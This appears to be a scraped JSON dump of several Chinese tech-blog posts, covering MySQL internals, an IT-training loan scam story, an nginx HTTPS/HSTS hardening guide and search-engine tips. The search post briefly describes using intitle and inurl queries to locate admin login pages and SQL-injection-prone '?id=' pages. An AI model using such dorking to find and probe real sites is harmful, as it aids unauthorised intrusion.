processlist输出中Sleep状态的时间 由于建立连接比较复杂，需要经过TCP 握手、权限认证等等，因此建议尽量使用长连接。但是全部使用长连接，会导致 MYSQL 内存占用过高，因为MYSQL 在执行过程中临时使用的内存是管理在连接对象里面的，这些资源需要连接断开才会释放。如果长时间积累会导致内存 OOM从而导致MYSQL 异常重启。 解决办法： 1.定期断开连接。 2.在5.7以后的版本可以在执行比较大的操作后，通过 mysql_reset_connection 来重新初始化连接资源，该过程无需重新做权限验证。 查询缓存连接建立后，可以执行查询语句，那么执行逻辑就会来到第二步，查询缓存。 mysql 拿到一个请求后会先到缓存查询，看看之前是不是执行过这条语句。之前执行过的语句以及其结果会以key-value 的形式被直接缓存在内存中，key是查询语句，value是查询结果。 如果语句不在查询缓存中，就会继续后面的执行阶段。执行完成后，执行结果会被缓存在查询缓存中。 但是大多数情况下不建议使用查询缓存，因为查询缓存弊大于利。因为查询缓存失效频繁，只要对一个表做更新，这个表的所有查询缓存都会被清空。除非你是一张静态表，很久才更新。 与查询缓存相关的参数： 1234567891011mysql&gt; SHOW GLOBAL VARIABLES LIKE &#39;query_cache%&#39;;+------------------------------+---------+| Variable_name | Value |+------------------------------+---------+| query_cache_limit | 1048576 || query_cache_min_res_unit | 4096 || query_cache_size | 1048576 || query_cache_type | OFF || query_cache_wlock_invalidate | OFF |+------------------------------+---------+5 rows in set (0.00 sec) 使用 query_cache_type 变量来开启查询缓存，开启方式有三种： ON : 正常缓存。表示在使用 SELECT 语句查询时，若没指定 SQL_NO_CACHE 或其他非确定性函数，则一般都会将查询结果缓存下来。 DEMAND ：指定SQL_CACHE才缓存。表示在使用 SELECT 语句查询时，必须在该 SELECT 语句中指定 SQL_CACHE 才会将该SELECT语句的查询结果缓存下来。 OFF： 关闭查询缓存。 开启查询缓存，修改my.cnf 中，query_cache_type = OFF ，为 ON 注意：当 my.cnf 中，query_cache_type = OFF 启动mysql服务后，在mysql命令行中使用上面语句开启查询缓存，会报错 12mysql&gt; set global query_cache_type&#x3D;1;ERROR 1651 (HY000): Query cache is disabled; restart the server with query_cache_type&#x3D;1 to enable it 分析器如果没有命中查询缓存，就开始执行真正的SQL 语句了，首先分析器会做”词法分析”，例如你输入一条语句： 1select * from user where Host&#x3D;&#39;localhost&#39;； 则 MYSQL 会从你输入的 select 这个关键词开始识别，这是一个查询语句，然后把 user 识别为一个表名，把Host 识别为一个列Host。 接下里会进行”语法分析”，语法分析器会根据语法规则，判断你的SQL 语法是否满足 MYSQL语法。如果语法不对，则出现如下错误： 1ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;q&#39; at line 4 优化器在sql 语句经过了分析器，MYSQL 就指定你要做什么了，，在开始执行之前，还需要经过优化器的处理。 优化器是在表里有多个索引的时候，决定使用哪个索引，或者在一个语句有关联的时候决定各个表的连接顺序。 优化器阶段完成后，就会进入执行阶段。 执行器通过分析器知道了你要做什么，通过优化器知道了该怎么做，接下来就进入执行阶段了。 开始执行语句的时候，要判断一下你对这个表有没有执行查询的权限，如果没有就会返回权限错误，如果有就打开表继续执行，打开表的时候，执行器会根据表的引擎定义去使用这个引擎的接口，比如我们使用的引擎是 InnoDB 引擎，那么上面的语句: 1select * from user where Host&#x3D;&#39;localhost&#39;； 的执行流程如下： 1.调用引擎接口区这个表的第一行,判断Host 是否是 localhost，如果不是，则跳过，如果是则将这行存在结果集中 2.调用引擎接口取下一行，继续判断，直到最后一行。 3.执行器将上述遍历过程中满足条件的行组成的记录集返回客户端。 至此，执行语句就完成了。 对于有索引的表，执行逻辑类似。 你会在数据库的慢查询日志中看到一个Rows_examined 的字段，这个值就是执行器每次调用引擎获取数据行的时候累加的。 123456# Time: 2019-03-20T05:11:59.731673Z# User@Host: root[root] @ localhost [] Id: 22# Query_time: 10.000289 Lock_time: 0.000000 Rows_sent: 1 Rows_examined: 0use mysql;SET timestamp&#x3D;1553058719;select sleep(10); 在有些场景下，执行器调用一次，在引擎内部则扫描了多行，因此引擎扫描行数并非完全相同。 本篇是一篇学习笔记，大部分内容来源于 极客时间 《Mysql 实战 45 讲》","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"https://awen.me/tags/mysql/"}]},{"title":"为什么说只要努力就可以成功是一碗毒鸡汤","slug":"为什么说只要努力就可以成功是一碗毒鸡汤","date":"2019-03-19T23:18:36.000Z","updated":"2021-02-26T06:05:29.298Z","comments":true,"path":"posts/50280.html","link":"","permalink":"https://awen.me/posts/50280.html","excerpt":"","text":"我直接说结论吧！努力没有错，但是努力并不一定可以成功，著名的老者曾经说过”自身努力固然重要，但是还是要看历史进程”。如果说你在一条逆历史进程的方向上努力，即使你在努力一千倍一万倍也是无济于事。到头来只不过是自我感动而已。 就拿农民来说吧，我感觉他们真的很努力，面朝黄土背朝天，起早贪黑的干活，农忙的时候早上天不亮就起来了，到晚上七八点才回家，然后干完活还要干家务做饭，忙的不可开交，等到吃完饭收拾收拾就九十点了，一天就过去了，可是就是不挣钱。你说这种努力有意义吗？ 为什么他们这么忙还不挣钱，因为他们干的是农活，这种低技术含量的只能靠出卖苦力为生的事情。 另外你们去看看工厂流水线的工人们和写字楼里的没日没夜加班 996 的所谓白领，以及服务性行业的从业人员，比如服务员，我并没有瞧不起他们，他们一天工作时长12小时以上，真的很累，但是一个月只能拿几千块钱的月薪，还不够城里买一平米房子的钱。他们不努力吗？工厂里的劳动强度远比你想象的重，否则富士康就不会出现那么多跳楼事件了。但是这些人当中一大部分人如果只是继续这样下去，哪怕是努力辛苦的干到死，他们也不会挣太多的钱。 为什么会这样?因为大多数人都陷入了穷人思维，我相信大多数去工厂打工的或者愿意拿几千块工资被强制996 的绝对不是城里的有钱人家的孩子，大多数都是农村或二三线城市普通人家的子女。他们为什么愿意选择去这些工资低、工作强度还高的地方打工？原因还是因为他们的原生家庭没有教会他们如何挣钱。 穷人思维是会遗传的，从一个简单的理财观念就可以看出来，有穷人思维的人大多都喜欢存钱，他们不喜欢贷款，而且他们有点钱就喜欢存银行。而富人会想办法让钱生钱。另外就是他们对待工作的态度，所有富有穷人思维的人都希望从事一份稳定体面的工作，他们不敢冒险。而富人富有冒险精神，所谓”富贵险中求”。","categories":[],"tags":[]},{"title":"套路贷+套路培训， IT 培训套路何时休?","slug":"套路贷-套路培训，-IT-培训套路何时休","date":"2019-03-18T07:27:49.000Z","updated":"2021-02-26T06:05:29.323Z","comments":true,"path":"posts/34552.html","link":"","permalink":"https://awen.me/posts/34552.html","excerpt":"315晚会曝光了各种类似 714的套路贷款，我就想起了我的朋友小王去年发生的事情。给大家分享下他的经历，希望给一些转行中的年轻人，尤其是刚毕业涉世不深的大学生一些警醒吧！","text":"315晚会曝光了各种类似 714的套路贷款，我就想起了我的朋友小王去年发生的事情。给大家分享下他的经历，希望给一些转行中的年轻人，尤其是刚毕业涉世不深的大学生一些警醒吧！ 小王是一名刚刚毕业没多久的大学生，因为大学期间学的是化学专业，毕业后一直没找到合适的工作，并且小王对本专业的未来就业前景表示很渺茫，因为化学行业相对来说还是一个传统行业，薪资待遇都不是特别高，而且大部分和化学相关的行业都是在偏远的二三线城市郊区工厂，迷茫的小王打算转行，之前在老家听说同学毕业后找了一份程序员的工作，薪资待遇一开始就七八千块钱一个月，干的好，几年后一万块钱一个月都是很正常的。小王很羡慕，于是想着转行去做程序员。 可是小王是学化学的，之前对这个行业并不了解，于是就打开百度搜索了怎么转行做开发，希望能够找到一些答案，结果满屏幕的培训机构广告，小王就点进去看了首页第一个链接“XX Java培训”，并且是上市公司，全国各地都有机构，小王就在线留下了联系方式，然后去现场咨询了，机构的老师告诉小王只要认真学习完，薪资可以达到8k以上并且他们是包就业的，小王很心动，经过一番咨询小王被机构老师推荐学习 Java 培训，但是实训费需要16800，小王刚毕业没有什么钱，又要面子，觉得自己长大成人了，不好意思找家里要钱，培训机构的老师告诉小王培训需要4个月时间，脱产，就是全天上课，培训期间4个月内每个月只需要缴纳200块钱，剩下的钱由集团垫付，等4个月后找到工作了每个月还款1000。小王一听这个好啊，对于刚毕业又没什么钱的大学生来说这个非常具有吸引力。于是就跟培训机构签了个合同，可是签合同的时候小王发现除了培训合同之外，还要和一个叫X信的商业贷款公司签订一个贷款合同，在这个合同中贷款金额16800，另外还需要手续费乱七八糟加起来一共差不多2万多块。一共要还24个月，但是当时小王急于转行，心想一个月8k，还款1000，其实也还好啦。于是就签了合同。 上课的时候小王发现不见老师，教室里只有一个项目经理，讲课的老师都是远程在授课，通过电视机实时同步视频，小王感觉很不爽，但是一想钱都交了，在换也不合适，于是就继续学了，可是在实际学习过程中，小王发现很多不懂的问题想问这个项目经理，他也是一窍不通，后来小王发现这些教室里的所谓项目经理其实都是之前培训的学员后来没找到工作留下来的。 班里的学员有很多都是转行的，有的之前是在工厂打工的，有的是自己做小吃不赚钱听说IT薪资高转行的，少数是计算机专业毕业后过来继续培训的，但是大多数也都是学校还没毕业就被学校忽悠过来培训的。这些学员的基础参差不齐，有的甚至连计算机的基础操作都不熟悉。 另外小王还发现在这个机构中天天都有陆陆续续的人过来面试，这些人大多都是转行的或者是在招聘网站投简历被忽悠过来进行面试的，面试时培训机构所谓的招聘人员会要求你做题目，然后会告知你达不到他们的要求，可以参加他们的培训，接下来的一切就和当初机构老师和小王说的一样了。 小王开始怀疑是不是被骗了。那所谓的 8k 包就业是不是也是谎言。 转眼4个月过去了，机构给安排了几次面试辅导，内容就是教大家怎么美化建立，怎么写简历。然后就推荐去找工作，面试的单位虽然是机构推荐的，但是实际上这些招聘信息根本就不是什么和机构合作的，而是培训机构从网上找来的招聘信息，只是推荐给学员去面试，至于过不过完全看学员自己。机构会要求学员对简历进行造假，比如伪造学历，伪造工作经验和项目经历。 小王发现学完后又失业了，因为被用人单位发现简历造假，而且培训机构给美化的简历上的项目经历几乎完全一模一样，小王只好乖乖的如实写简历，面试多家单位，只有少数几家有意向要他，但是薪资也不是机构说的 8k起步，而是只给他开了4k的工资。可是眼前的压力，以及接下来每个月要还的带宽小王只好先找了个4k的工作，但是工作内容也并不是Java编程。 每个月的工资到手扣除生活费+房租+贷款，小王每个月都捉襟见肘，没多久，小王所在的单位因为经济环境裁员，小王很不幸的被裁了，没了工作，每个月还有一笔1000块的贷款需要还，小王发现自己的人生从未如此的黑暗过。很快小王决定不还这笔贷款了，因为他觉得培训机构并没有实现他们承诺的月薪 8k。 后来小王没有如期还款，但是从此每天都会接到贷款公司的催收电话，不停的打，电话中还带着各种恐吓、谩骂和威胁，甚至连小王的亲戚朋友都接到催款电话。无奈之下，小王只好求助于家人帮忙还款，但是还款的金额从原来的每月1000多变成了一次性要还3万多。 小王当然不同意，于是决定起诉这家培训机构，然而小王并没有胜诉，因为和他签订贷款的并不是这家培训机构，而是另外一家贷款公司。小王像吃了黄莲一样，满肚子的苦水无处吐。可是起诉这家贷款公司似乎也是没有胜算的，因为从法律上看是因为小王违约在先，无奈之下，小王只好乖乖的按照贷款公司的要求找家人帮忙还清了欠款，在和贷款公司多次沟通后，因为违约小王要多付5000块钱，这其中包括利息、服务费、违约金等等，也就是一次培训总共花了25000。还不算这期间脱产上课所产生的食宿费用，小王觉得这次培训真的是太坑了。 这是一个真实的故事，只不过这里我用小王这个化名来代替他的名字，从小王的经历中我们可以吸取以下的经验和教训： 第一，选择靠谱的培训机构，小王在选择培训机构之前未对该机构做深入的了解就跑过去报班了，应当货比三家，至少应当事先查一下对方机构有没有负面消息。这些网上应该非常好查到的。 第二，一般培训机构推出的贷款业务一定要根据自己的实际情况慎重选择，建议不要选择此类贷款，可以和父母商量，先找父母帮忙或向父母借钱，因为这些商业贷款都是以盈利为目的的，且利率非常高，非常不推荐。 第三，所有承诺 100% 包分配包就业的机构都是骗子。 第四，培训只是一种学习手段，关键还是得看个人努力和天赋。并不是每个人都适合从事编程这个行业，所以千万不要冲着高薪就选择这一行，一定要根据自己的兴趣和职业规划选择行业。IT行业高薪只有少数人顶端从业者，这些人大多都是高学历，科班出身、且工作经历丰富，而大多数刚入行的从业者薪酬待遇并不是你想象的那么高。即使是非科班出身的，也是需要多年的积累以及相应的机遇才可能拥有较高的薪酬。所以不要被培训机构的数据骗了。 第五，不论是哪一个行业，刚入行的薪酬待遇普遍都不高，千万不要觉得参加一个培训就可以月薪过万了，自身的努力和不断的学习以及经验的积累，才是你的在一个行业的安身立命之本。 同时在这里也希望相关部门加强对培训市场进行监管，避免这种以求职面试为名义的忽悠应聘者参加培训，以商业消费贷款名义假冒助学贷款来欺骗消费者。尤其是欺骗刚毕业的大学生。 本文原创首发于 CSDN 程序人生，如需转载，请联系 CSDN","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"HTTPS  最佳实践","slug":"HTTPS-最佳实践","date":"2019-03-18T07:26:21.000Z","updated":"2021-02-26T06:05:29.248Z","comments":true,"path":"posts/51122.html","link":"","permalink":"https://awen.me/posts/51122.html","excerpt":"让你的 HTTPS 站点更安全通常一个 web 站点开启 HTTPS ，以 nginx 为例，我们可以这样进行配置： 1234567891011server &#123; listen 443 ssl http2; server_name www.example.com; index index.html index.htm; root &#x2F;www&#x2F;www; ssl on; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_certificate &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;ssl&#x2F;example.com.rsa.cer; ssl_certificate_key &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;ssl&#x2F;example.com.rsa.key; ssl_ciphers AES128-SHA:AES256-SHA:RC4-SHA:DES-CBC3-SHA:RC4-MD5;;&#125;","text":"让你的 HTTPS 站点更安全通常一个 web 站点开启 HTTPS ，以 nginx 为例，我们可以这样进行配置： 1234567891011server &#123; listen 443 ssl http2; server_name www.example.com; index index.html index.htm; root &#x2F;www&#x2F;www; ssl on; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_certificate &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;ssl&#x2F;example.com.rsa.cer; ssl_certificate_key &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;ssl&#x2F;example.com.rsa.key; ssl_ciphers AES128-SHA:AES256-SHA:RC4-SHA:DES-CBC3-SHA:RC4-MD5;;&#125; 上述 nginx 配置中包含了配置监听端口、开启ssl、配置证书、以及支持的加密算法。一般来说用户访问域名不可能直接在浏览器的地址栏中输入 https://www.example.com 来进行访问，而是输入域名，默认情况下是通过 HTTP 协议来进行访问的，即 http://www.example.com，因此，在nginx 的配置中我们还需要定义一个server 段来处理 HTTP 的访问。 1234567server &#123; listen 80 default_server; server_name _ www.example.com; location &#x2F; &#123; return 302 https:&#x2F;&#x2F;$host$request_uri; &#125;&#125; 上述配置中监听了 80端口，并且定义了一个 location，将 HTTP 请求 302 跳转到 HTTPS 的Host 去。这样就实现了用户不管怎么访问都可以跳转到 HTTPS 。 但是问题来了，这样的配置其实是有缺陷的，如果用户端从浏览器手动输入的是 HTTP 地址，或者从其它地方点击了网站的 HTTP 链接，那么浏览器会依赖于服务端 301/302 跳转才能使用 HTTPS 服务。而第一次的 HTTP 请求就有可能被劫持，因为中间的数据传输是明文的，就有可能会导致请求无法到达服务器，从而构成 HTTPS 降级劫持。 要解决降级劫持，我们可以使用HSTS 什么是 HSTS HSTS（HTTP Strict Transport Security，HTTP 严格传输安全)，是一套由互联网工程任务组发布的互联网安全策略机制。网站可以通过配置 HSTS，来强制浏览器使用 HTTPS 与网站通信，保障网站更加安全。 HSTS的作用是强制客户端（如浏览器）使用HTTPS与服务器创建连接。服务器开启HSTS的方法是，当客户端通过HTTPS发出请求时，在服务器返回的超文本传输协议响应头中包含 Strict-Transport-Security 字段。非加密传输时设置的HSTS字段无效。比如，https://example.com/的响应头含有Strict-Transport-Security: max-age=31536000; includeSubDomains。这意味着两点：在接下来的一年（即31536000秒）中，浏览器只要向example.com或其子域名发送HTTP请求时，必须采用HTTPS来发起连接。比如，用户点击超链接或在地址栏输入 http://www.example.com/ ，浏览器应当自动将 http 转写成 https，然后直接向 https://www.example.com/ 发送请求。在接下来的一年中，如果 example.com 服务器发送的TLS证书无效，用户不能忽略浏览器警告继续访问网站。 如何进行配置 以 nginx 为例，我们在对应域名的 vhost 中增加响应头 12345server &#123; .... add_header Strict-Transport-Security &quot;max-age&#x3D;31536000; includeSubDomains; preload&quot;; ...&#125; 参数解释 max-age，单位是秒，用来告诉浏览器在指定时间内，这个网站必须通过 HTTPS 协议来访问。也就是对于这个网站的 HTTP 地址，浏览器需要先在本地替换为 HTTPS 之后再发送请求。 includeSubDomains，可选参数，如果指定这个参数，表明这个网站所有子域名也必须通过 HTTPS 协议来访问。 preload，可选参数HSTS 这个响应头只能用于 HTTPS 响应；网站必须使用默认的 443 端口；必须使用域名，不能是 IP。而且启用 HSTS 之后，一旦网站证书错误，用户无法选择忽略。 浏览器请求后响应头中会显示 1strict-transport-security:max-age&#x3D;31536000 如图所示 HSTS 可以很好的解决 HTTPS 降级攻击，但是对于 HSTS 生效前的首次 HTTP 请求，依然无法避免被劫持。浏览器厂商们为了解决这个问题，提出了 HSTS Preload List 方案：内置一份可以定期更新的列表，对于列表中的域名，即使用户之前没有访问过，也会使用 HTTPS 协议。目前这个 Preload List 由 Google Chrome 维护，Chrome、Firefox、Safari、IE 11 和 Microsoft Edge 都在使用。如果要想把自己的域名加进这个列表，首先需要满足以下条件： 拥有合法的证书（如果使用 SHA-1 证书，过期时间必须早于 2016 年）； 将所有 HTTP 流量重定向到 HTTPS； 确保所有子域名都启用了 HTTPS； 输出 HSTS 响应头： max-age 不能低于 18 周（10886400 秒）； 必须指定 includeSubdomains 参数； 必须指定 preload 参数； 但是，即便满足了上述所有条件，也不一定能进入 HSTS Preload List，更多信息可以看这里。通过 Chrome 的 chrome://net-internals/#hsts 工具，可以查询某个网站是否在 Preload List 之中，还可以手动把某个域名加到本机 Preload List。 对于 HSTS 以及 HSTS Preload List，我的建议是只要你不能确保永远提供 HTTPS 服务，就不要启用。因为一旦 HSTS 生效，你再想把网站重定向为 HTTP，之前的老用户会被无限重定向，唯一的办法是换新域名。 如果确定要开启，点击https://hstspreload.org，输入你的域名，勾选协议，提交即可。 确认后，你就可以将你的域名提交给 HSTS 预加载列表了 提交成功后会给你返回成功的信息，不过你要保证你的配置比如是一直开启了，否则也会从列表中删除。 再次访问，查看浏览器响应头 此外，我们要做到让HTTPS 网站更安全更快速，还应当做到以下几点： 第一，密钥要足够的复杂，以rsa 密钥对为例，最好超过2048位； 第二，ssl_ciphers 的合理配置，尽量抛弃那些已经被证明不安全的加密算法，使用较新的被证明无安全威胁的算法，例如可以这样配置： 1ssl_ciphers EECDH+CHACHA20:EECDH+CHACHA20-draft:EECDH+ECDSA+AES128:EECDH+aRSA+AES128:RSA+AES128:EECDH+ECDSA+AES256:EECDH+aRSA+AES256:RSA+AES256:EECDH+ECDSA+3DES:EECDH+aRSA+3DES:RSA+3DES:TLS-CHACHA20-POLY1305-SHA256:TLS-AES-256-GCM-SHA384:TLS-AES-128-GCM-SHA256:EECDH+CHACHA20:EECDH+AESGCM:EECDH+AES:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!KRB5:!aECDH:!EDH+3DES; 第三，避免使用已经被证明不安全的加密协议，例如 SSLV2和SSLV3 ，而使用 TLSv1.2 TLSv1.3； 1ssl_protocols TLSv1.2 TLSv1.3; 一般来说较新的协议都是针对上一个版本进行了很多的优化，比如TLS1.2和TLS1.3协议，可以看下这2个协议的加密过程，首先，我们看下 TLS1.2的加密过程： 以 ECDHE 密钥交换算法为例，TLS1.2协议完整的SSL握手过程如下: 第一步，首先客户端发送ClientHello消息，该消息中主要包括客户端支持的协议版本、加密套件列表及握手过程需要用到的ECC扩展信息； 第二步，服务端回复ServerHello，包含选定的加密套件和ECC扩展；发送证书给客户端；选用客户端提供的参数生成ECDH临时公钥，同时回复ServerKeyExchange消息； 第三步，客户端接收ServerKeyExchange后，使用证书公钥进行签名验证，获取服务器端的ECDH临时公钥，生成会话所需要的共享密钥；生成ECDH临时公钥和ClientKeyExchange消息发送给服务端； 第四步，服务器处理ClientKeyExchange消息，获取客户端ECDH临时公钥；服务器生成会话所需要的共享密钥；发送密钥协商完成消息给客户端； 第五步，双方使用生成的共享密钥对消息加密传输，保证消息安全。 可以看到，TLS1.2 协议中需要加密套件协商、密钥信息交换、ChangeCipherSpec 协议通告等过程，需要消耗 2-RTT 的握手时间，这也是造成 HTTPS 协议慢的一个重要原因之一。 通过抓包分析，我们可以看到他的整个加密过程： 接下来，我们看下 TLS 1.3 的的交互过程，如图所示: 抓包得后如图所示，可以看到客户端的整个加密过程： 在 TLS 1.3 中，客户端首先不仅发送 ClientHello 支持的密码列表，而且还猜测服务器将选择哪种密钥协商算法，并发送密钥共享,这可以节省很大一部分的开销，从而提高了速度。 TLS1.3 提供 1-RTT 的握手机制，还是以 ECDHE 密钥交换过程为例，握手过程如下。将客户端发送 ECDH 临时公钥的过程提前到 ClientHello ，同时删除了 ChangeCipherSpec 协议简化握手过程，使第一次握手时只需要1-RTT，来看具体的流程: 客户端发送 ClientHello 消息，该消息主要包括客户端支持的协议版本、DH密钥交换参数列表KeyShare； 服务端回复 ServerHello，包含选定的加密套件；发送证书给客户端；使用证书对应的私钥对握手消息签名，将结果发送给客户端；选用客户端提供的参数生成 ECDH 临时公钥，结合选定的 DH 参数计算出用于加密 HTTP 消息的共享密钥；服务端生成的临时公钥通过 KeyShare 消息发送给客户端； 客户端接收到 KeyShare 消息后，使用证书公钥进行签名验证，获取服务器端的 ECDH 临时公钥，生成会话所需要的共享密钥； 双方使用生成的共享密钥对消息加密传输，保证消息安全。 如果客户端之前已经连接，我们有办法在 1.2 中进行 1-RTT 连接，而在 TLS 1.3 中允许我们执行 0-RTT连接，如图所示: 当然，具体采用 TLS1.2 还是 TLS1.3 需要根据实际的业务场景和用户群体来决定，在较新版本的浏览器一般都支持最新的加密协议，而类似 IE 8 以及Windows xp 这种古老的浏览器和操作系统就不支持了。如果说你的用户是一些政府部门的客户，那么就不适合采用这种较新的技术方案了，因为据我所知很多政府部门的操作系统还是xp和 IE 8以下的版本，这会导致新协议无法在他们的操作系统中正常工作。因此你可以讲加密算法和加密协议多配置几个，向下兼容不同客户端。 第四，证书要从可靠的CA厂商申请，因为不可靠的厂商（比如不被主流浏览器信任的证书厂商）会乱修改证书日期，重复签发证书。此外即使是可靠的 CA 签发的证书也有可能是伪造的，比如赛门铁克之前就被曝出丑闻而被火狐和Chrome 惩罚，结果就是这些主流浏览器不在信任这些CA 机构签发的一部分证书。因此一旦发现证书不受信任要尽快替换。 第五，使用完整的证书链，如果证书链不完整，则很有可能在一些版本的浏览器上访问异常。 第六，使用HTTP/2，使用最新的 HTTP 2 可以提升网站的访问速度以及拥有更好的性能支持。 第七，保护证书私钥不被外泄。 第八，根据自己的业务需求选择合适的证书,证书分为自签证书、 DV、 EV 和OV 证书，一般来说只是需要进行简单的数据加密，采用 DV 证书即可，这类证书通常都可以免费申请，只需要进行简单的域名所有者权验证即可申请，而EV和OV证书一般价格昂贵，适合金融机构或针对数据加密有严格要求的单位使用，这类证书签发手续复杂，一般需要进行企业身份认证后才会签发。自签证书一般用户临时测试使用，不建议生产环境使用，因为它并不是受信任的CA 机构签发的，浏览器不会信任。 当我们配置完后，可以通过https://www.ssllabs.com/ssltest/ ，对你的 HTTPS 站点进行评分，如果是A+,则说明你的站点安全性特别高。如图所示，如果评分不高，你可以查看具体的详情来针对你的站点进行更具体的优化。 最后，附上一份nginx 的配置，作为参考： 1234567891011121314151617181920212223242526272829303132server &#123; listen 443 ssl http2 default_server; server_name www.example.com ; index index.html index.htm index.php; root &#x2F;web; ssl on; ssl_certificate &#x2F;nginx&#x2F;ssl&#x2F;awen&#x2F;fullchain.cer; ssl_certificate_key &#x2F;nginx&#x2F;ssl&#x2F;example&#x2F;example.com.key; ssl_ciphers EECDH+CHACHA20:EECDH+CHACHA20-draft:EECDH+ECDSA+AES128:EECDH+aRSA+AES128:RSA+AES128:EECDH+ECDSA+AES256:EECDH+aRSA+AES256:RSA+AES256:EECDH+ECDSA+3DES:EECDH+aRSA+3DES:RSA+3DES:TLS-CHACHA20-POLY1305-SHA256:TLS-AES-256-GCM-SHA384:TLS-AES-128-GCM-SHA256:EECDH+CHACHA20:EECDH+AESGCM:EECDH+AES:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!KRB5:!aECDH:!EDH+3DES; ssl_prefer_server_ciphers on; ssl_protocols TLSv1.2 TLSv1.3; ssl_session_cache shared:SSL:50m; ssl_session_timeout 1d; ssl_session_tickets on; resolver 114.114.114.114 valid&#x3D;300s; resolver_timeout 10s; add_header Strict-Transport-Security &quot;max-age&#x3D;31536000; includeSubDomains; preload&quot;; add_header X-Frame-Options deny; add_header X-Content-Type-Options nosniff; add_header CIP $http_x_real_ip; add_header Accept-Ranges bytes;&#125;server &#123; listen 80; server_name _; server_name www.example.com ; return 302 https:&#x2F;&#x2F;$host$request_uri;&#125; 好了，以上就是我给大家分享的关于 HTTPS 站点的优化建议。 本文原创首发于 CSDN，如需转载，请联系CSDN","categories":[],"tags":[{"name":"https","slug":"https","permalink":"https://awen.me/tags/https/"}]},{"title":"你真的会使用搜索引擎吗","slug":"你真的会使用搜索引擎吗","date":"2019-03-15T12:21:27.000Z","updated":"2021-02-26T06:05:29.301Z","comments":true,"path":"posts/31537.html","link":"","permalink":"https://awen.me/posts/31537.html","excerpt":"最近看了一非常棒的悬疑片—《网络谜踪》，英文名《Searching》，这是一部非常特别的电影，最开始豆瓣评分始9.2，目前看评分是8.6分。被评为 2018年最火爆的悬疑片。","text":"最近看了一非常棒的悬疑片—《网络谜踪》，英文名《Searching》，这是一部非常特别的电影，最开始豆瓣评分始9.2，目前看评分是8.6分。被评为 2018年最火爆的悬疑片。 这部片子的特别之处在于他的拍摄手法，整部片子完全是通过电脑摄像头和电脑桌面以及手机的摄像头拍摄展现，当然剧情也是非常棒的，我就不过多剧透了，该片主要讲述的是一位工程师父亲因为女儿被绑架了，然后通过搜索引擎、直播网站、社交网站等等方式查询线索最终找出了绑架女儿的凶手。 这部片子是由前谷歌员工阿尼什·查甘蒂执导拍摄的，据说为了彻底投入新片的制作，阿尼什辞掉谷歌的工作，经过1年半的细心筹备，陆续游说演员尝试这种新奇的拍法。仅13天就拍摄完毕，却剪辑了超过2年才完成最后成片。 说道谷歌，可能无人不知道无人不晓，相比较于国内的搜索引擎，比如百度，谷歌的搜索质量比百度高并且搜索体验也非常好，尤其是对于 IT 行业从业者，使用谷歌应该是一项最基本的生存技能(至少我觉得使用百度搜索的程序员质量都不咋地，因为大部分的技术性资料通过百度搜索结果是非常糟糕的，比如搜索一个技术，出来的结果全部都是培训机构的广告）但是你真的会使用搜索引擎吗？ 本文就跟大家分享下搜索中的一些实用性的搜索小技巧。 搜索技巧就是在搜索关键字时，配合一些通配符，帮助快速定位到想要的结果。而不至于大海捞针一样在网络中搜寻半天还找不到自己想要的内容。 使用””进行完全匹配 在搜索过程中，我们可以使用&quot;&quot;来将需要搜索的关键词进行引用，得到的搜索记过就是完全按照关键词的顺序来进行搜索。 举个例子，我们不用引号搜索关键词 Java 多线程 搜索的结果如下，圈出来的部分是未完全按照关键词顺序搜索的。 而使用引号搜索，其结果如下 使用-排除关键字 搜索过程中，我们可以使用-号排除一些关键词，比如我们希望搜索结果中不要出现 baijiahao.baidu.com 的内容。则搜索关键词后面加上-baijiahao.baidu.com 即可。 使用方法： 关键词 -需要排除的关键词 当然谷歌也可以使用加号+用于强制搜索，即必须包含加号后的内容。一般与精确搜索符一起应用。此外谷歌还支持 布尔搜索，即通过 or 或and 进行搜索 。 另外例如数字范围搜索，即搜索某一个时间到某一个时间内的信息。可以用两个点号..表示一个数字范围，例如2011..2019，表示搜索2011年到2019年之间的信息。 使用site指定网站 使用方法： site:网址 关键字 例如只希望在csdn.com 查询关键词Java 循环，则输入关键词 site: csdn.com Java 循环 使用filetype指定文件类型 使用方法：关键字 filetype:文件类型 例如搜索pdf 版的 Java 编程思想，输入关键词 java编程思想 filetype:pdf 即可。 只有Google支持的filetype才可用,谷歌所支持的filetype，可以在https://support.google.com/webmasters/answer/35287?hl=en查看 使用*进行模糊匹配 使用方法： 关键词内加入通配符 * 例如搜索 python range 假设你range 忘记怎么写了，可以输入 rang* 使用intile 属性查找网站 intitle 关键词 例如hacking 一把带后台登录的网站 *inurl 查找网站漏洞 可以通过inurl查找特定网站url 是否带有sql注入漏洞 找到一个带?id=xxxx页面，修改id=xxxx可以看到该页面抛出了 sql 异常，说明该页面可能存在sql 注入漏洞 查看汇率 查看上证指数 查询天气 计算器 图片搜索 谷歌的图片搜索可以说非常强大，他已经可以强大到检索图片上的文字了。 总结 作为一名互联网从业者，学会使用搜索引擎可以让我们更好的更高效的查找资料，解决问题。","categories":[],"tags":[{"name":"科技","slug":"科技","permalink":"https://awen.me/tags/%E7%A7%91%E6%8A%80/"}]},{"title":"文科生如何转行互联网行业做技术，应该怎么准备","slug":"文科生如何转行互联网行业做技术，应该怎么准备","date":"2019-03-14T23:18:42.000Z","updated":"2021-02-26T06:05:29.341Z","comments":true,"path":"posts/56446.html","link":"","permalink":"https://awen.me/posts/56446.html","excerpt":"大家好，我是阿文，目前就职于网易杭州研究院云计算技术部，今天我和大家聊一聊转行这个话题。给那些迷茫的想转行的年轻人一点点鼓励。 如果你和我一样在当初上大学的时候因为各种原因脑子进了水选了个文科，那么接下来我的一些经历可能会对你有所帮助。","text":"大家好，我是阿文，目前就职于网易杭州研究院云计算技术部，今天我和大家聊一聊转行这个话题。给那些迷茫的想转行的年轻人一点点鼓励。 